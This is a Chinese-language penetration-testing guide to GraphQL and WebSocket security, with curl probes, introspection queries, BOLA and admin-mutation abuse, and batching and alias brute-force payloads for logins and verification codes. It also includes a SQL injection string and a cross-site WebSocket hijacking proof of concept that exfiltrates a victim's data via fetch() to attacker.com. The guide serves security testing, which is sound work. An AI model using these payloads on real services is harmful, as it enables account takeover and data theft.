# GraphQL / WebSocket 安全

> GraphQL 与 WebSocket 是现代 Web 重要接入点, 传统 API 测试方法不完全适用。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| `/graphql` / `/api/graphql` / `/graphiql` / `/playground` 200 | GraphQL 端点 | §一 §1.2 内省 |
| 响应 JSON 含 `errors` + `locations` 字段 | GraphQL 服务 | §一 |
| 内省查询返回 `__schema` | Schema 暴露 | §一 §1.3 mutation/越权 |
| WebSocket 升级 (`Upgrade: websocket`) | WS 接入点 | §二 |
| `/socket.io/` / `/ws` / `/wss` | WebSocket 端点 | §二 |
| WS 连接无认证 / Origin 不校验 | 跨站 WS / 越权 | §二 §2.x |
| WS 消息 JSON 含敏感操作 | 业务越权可能 | §二 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 内省被禁但无 disable | 部分禁用 | 试 `__type(name:"User")` 单类型查询 |
| 嵌套查询返 502 / 超时 | DoS 限制 / 真挂了 | 评估深度,降级测试 |
| WS 连接立即关闭 | Origin/认证拦截 | 加 Origin Header / Cookie |
| Mutation 返 forbidden | 角色控制 | 试普通用户调管理 mutation (BFLA) |

详细方法见 §一 (GraphQL) / §二 (WebSocket)。

---

## 一、GraphQL 安全

### 1.1 识别 GraphQL 端点

```
/graphql
/graphql/v1
/api/graphql
/graphiql           (交互 IDE)
/playground         (交互 IDE)
/voyager            (Schema 可视化)
/__graphql
/gql
```

批量探测:
```bash
for path in graphql graphql/v1 api/graphql graphiql playground voyager __graphql gql; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
    [ "$code" != "404" ] && echo "$path: $code"
done

# 识别 GraphQL 的响应特征
curl -s https://target.com/graphql -d '{"query":"{}"}' -H "Content-Type: application/json"
# 返回的 JSON 包含 "errors" + "locations" 即 GraphQL
```

### 1.2 内省查询 (Introspection)

```graphql
# 完整 Schema
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args {
          name
          type { name kind ofType { name kind } }
          defaultValue
        }
      }
    }
  }
}

# 简化版
{__schema{queryType{fields{name description}}}}

# 看 mutations
{__schema{mutationType{fields{name description}}}}
```

**curl 测试**:
```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name}}}}}}}}"}'
```

### 1.3 工具

| 工具 | 用途 |
|------|------|
| **InQL** (Burp 插件) | Schema 提取 / mutation 生成 / 历史重放 |
| **GraphQL Voyager** | 可视化 Schema |
| **graphql-cop** | 自动化安全扫描 |
| **graphw00f** | 指纹识别(Apollo/Hasura/Yoga 等) |
| **clairvoyance** | 内省关闭时仍可枚举字段 |

### 1.4 攻击面清单

#### A. 内省未关闭
```graphql
# 如果内省没关, 整个 Schema 暴露
```

#### B. 内省关了但仍可枚举 (Clairvoyance)

即使 `__schema` 返回错误, 也可通过 **字段建议错误** (Did you mean) 逐字爆破字段:
```graphql
query { user(Id: 1) { idd } }
# 响应: "Cannot query field 'idd' on type 'User'. Did you mean 'id'?"
```

```bash
clairvoyance -u https://target.com/graphql -o schema.json
```

#### C. BOLA / 越权

```graphql
# A 账号查 B 的数据
query { user(id: "VICTIM_ID") { email phone orders { amount } } }
```

GraphQL 的对象级授权比 REST 更难做对, BOLA 是 GraphQL 最常见漏洞。

#### D. 嵌套查询 DoS

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { name }
          }
        }
      }
    }
  }
}
```

若每层 friends 返回 100 个 → 100^5 = 10 亿次解析 → DoS。

#### E. Mutation 越权

普通用户调用 admin mutations:
```graphql
mutation { deleteUser(id: "VICTIM") { success } }
mutation { updateUser(id: "VICTIM", input: {role: ADMIN}) { id } }
mutation { grantPermission(userId: "ATTACKER", permission: "ADMIN") { ok } }
```

#### F. Batching 攻击 (多查询绕过速率限制)

```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"3\") { token } }"},
  ...
]
```

一次请求几十个查询 → 绕过 "每分钟 10 次" 的限速。

#### G. Alias 爆破

```graphql
query {
  a1: login(user: "admin", pass: "pass1") { token }
  a2: login(user: "admin", pass: "pass2") { token }
  a3: login(user: "admin", pass: "pass3") { token }
  # ... 100 个
}
```

单个请求内用 alias 做千次尝试。

#### H. GraphQL SQL 注入

若 GraphQL resolver 拼接 SQL:
```graphql
query { users(filter: "id=1' UNION SELECT password FROM admins--") { name } }
```

#### I. Authorization Header 注入

```graphql
query { user(id: 1) { email } }
```
以不带 Token 的匿名请求, 看是否仍返回数据。

#### J. CSRF / GET 方式查询

```
GET /graphql?query={user(id:1){email}}
```
GET 方法若接受则可 CSRF。

#### K. 错误信息泄露

GraphQL 错误可能含堆栈/SQL/内部字段名:
```json
{"errors": [{"message": "SQL: SELECT * FROM users WHERE id='xx'", "path": ["user"]}]}
```

### 1.5 GraphQL 引擎识别 (graphw00f 指纹)

| 引擎 | 特征 |
|------|------|
| Apollo | `Cannot query field "blah"` 错误语法 |
| Hasura | `field "blah" not found in type: 'query_root'` |
| GraphQL Yoga | `Did you mean` 建议 |
| Sangria (Scala) | `Unknown argument` 语法 |
| Graphene (Python) | Python 风格错误 |
| Hotchocolate (.NET) | `Unknown field` + C# 风格 |

不同引擎在 Query complexity / 速率限制 / 内省等方面有不同默认值, 识别引擎 = 知道攻击方向。

### 1.6 PoC 模板

```bash
# 枚举 mutations
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}}"}'

# 尝试越权(BOLA)
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_A" \
  -d '{"query":"query { user(id: \"VICTIM_B_ID\") { email phone passwordHash } }"}'

# 批量(Batching)爆破
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(user:\"admin\", pass:\"p1\") { token } }"},
    {"query": "mutation { login(user:\"admin\", pass:\"p2\") { token } }"}
  ]'
```

### 1.7 Testing Checklist

- [ ] 识别 GraphQL 端点 (grep `/graphql`)
- [ ] 尝试内省查询
- [ ] 若关了, 用 clairvoyance 枚举字段
- [ ] 识别引擎(graphw00f)
- [ ] 枚举 queries / mutations / subscriptions
- [ ] BOLA: 用 A 账号查 B 的数据
- [ ] 匿名访问: 删除 Authorization 看响应
- [ ] 嵌套 DoS: 5-10 层 friends/comments
- [ ] Alias 爆破: 同一 query 多别名
- [ ] Batching: 数组请求绕过速率限制
- [ ] 错误信息: 尝试注入非法字段观察响应
- [ ] Mutation 越权: 普通用户调 admin 操作
- [ ] CSRF: 能否用 GET 触发 mutation

### 1.8 False Positive

| 陷阱 | 真相 |
|------|------|
| 内省关了 → 以为无洞 | Clairvoyance 仍能爆破 |
| BOLA 返回 null | 可能只是字段没值, 试更多字段 |
| 嵌套查询返回错误 | 可能是深度限制, 减少层数测试 |
| 速率限制触发 | 用 Batching 单请求内多查询绕过 |

---

## 二、WebSocket 安全

### 2.1 识别

```http
# 升级请求
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

浏览器 JS:
```javascript
const ws = new WebSocket("wss://target.com/ws");
```

### 2.2 攻击面

#### A. Origin 校验缺失 → CSWSH (Cross-Site WebSocket Hijacking)

若服务端不校验 Origin, 攻击者可从 `evil.com` 建立到 target 的 WS 连接, 浏览器自动带上 target 的 Cookie:

```html
<!-- evil.com -->
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => ws.send(JSON.stringify({cmd: "get_user_info"}));
ws.onmessage = (e) => fetch("https://attacker.com/?data=" + btoa(e.data));
</script>
```

受害者访问 evil.com, WS 连接以其身份建立, 数据被窃。

#### B. 未认证

若升级后的 WS 通道不校验 Session, 任何人可连。

#### C. 消息注入

WS 协议本身是 binary/text stream, 应用层往往自定义协议(JSON/Protobuf), 易存在:
- SQL 注入 (WS 消息被拼接到 SQL)
- XSS (WS 消息被前端 innerHTML)
- 命令注入 (WS 消息参数传到 exec)
- 越权 (改 WS 消息中的 userId)

#### D. Rate Limit 缺失

WS 长连接, 每秒发 1000 条消息, 后端未限速 → DoS。

### 2.3 测试工具

| 工具 | 用途 |
|------|------|
| **wsrepl** | 交互式 WS 攻击终端 |
| **ws-harness.py** | WS 代理, 支持 fuzz |
| **Burp Suite** | 自带 WebSocket Message Editor |
| **websocat** | CLI WS 客户端 |

### 2.4 CSWSH 完整 PoC

```html
<!DOCTYPE html>
<html><body>
<h1>CSWSH PoC</h1>
<script>
const ws = new WebSocket("wss://target.com/ws/chat");

ws.onopen = () => {
    console.log("Connected with victim's session");
    // 获取用户资料
    ws.send(JSON.stringify({action: "get_profile"}));
    // 读取消息历史
    ws.send(JSON.stringify({action: "get_messages", limit: 100}));
};

ws.onmessage = (e) => {
    console.log("Received:", e.data);
    // 外带数据到攻击者
    fetch("https://attacker.com/log", {
        method: "POST",
        body: e.data
    });
};

ws.onerror = (e) => console.log("Error:", e);
</script>
</body></html>
```

### 2.5 Testing Checklist

- [ ] 握手时删除/修改 Origin 头 → 仍建立?
- [ ] 发 `Origin: https://evil.com` → 仍建立?
- [ ] 发 `Origin: null` → 仍建立?
- [ ] 删除 Authorization/Cookie → WS 仍连接?
- [ ] WS 消息中的字段测注入(SQL/XSS/命令)
- [ ] WS 消息中的 userId/orderId 试越权
- [ ] 速率限制: 1000 条/秒 → 后端是否崩?
- [ ] 协议降级: 用 HTTP/1.1 + Upgrade 试服务端是否支持明文 WS
- [ ] 握手后直接发 HTTP 请求: 是否返回应用层响应
- [ ] WSS 证书是否验证 hostname(中间人可能)

### 2.6 False Positive

| 陷阱 | 真相 |
|------|------|
| Origin 校验严格 → 以为无洞 | 注入点可能在消息内容, 仍要测 |
| 握手需 Token → 以为安全 | Token 泄露 / 可预测仍是问题 |
| WS 消息是 binary(Protobuf) | 可用 protoc 解析, 然后操控字段 |
| 消息 JSON schema 严格 | 字段可能被应用层信任, 仍可越权 |

---

## 三、组合攻击

### 3.1 GraphQL + BOLA + Alias 快速批量数据提取

```graphql
query {
  u1: user(id: "1") { email phone }
  u2: user(id: "2") { email phone }
  u3: user(id: "3") { email phone }
  # ... 用 alias 一次性拿数千用户
}
```

### 3.2 WS + XSS

WS 消息前端 innerHTML → 攻击者通过 CSWSH 发送 XSS payload → 自己触发 XSS。

### 3.3 GraphQL Batching + 爆破验证码

```json
[
  {"query": "mutation { verify(code: \"0000\") { ok } }"},
  {"query": "mutation { verify(code: \"0001\") { ok } }"},
  ...
  {"query": "mutation { verify(code: \"9999\") { ok } }"}
]
```

单请求内完成 10000 次尝试, 秒杀速率限制。

---

## 四、相关参考

| 内容 | 文件 |
|------|------|
| API 安全基础 | [../api-security.md](../api-security.md) |
| BOLA/IDOR | [../api-security.md](../api-security.md) §BOLA/IDOR |
| XSS(WS 消息常反射) | [xss.md](xss.md) |
| CSRF(类似 CSWSH) | [csrf-clickjacking.md](csrf-clickjacking.md) |
| SQL 注入 | [sqli.md](sqli.md) |

---

**CVSS 典型**: GraphQL BOLA 8.1 / CSWSH 8.1 / GraphQL DoS 5.3 / Batching 绕过速率 6.5
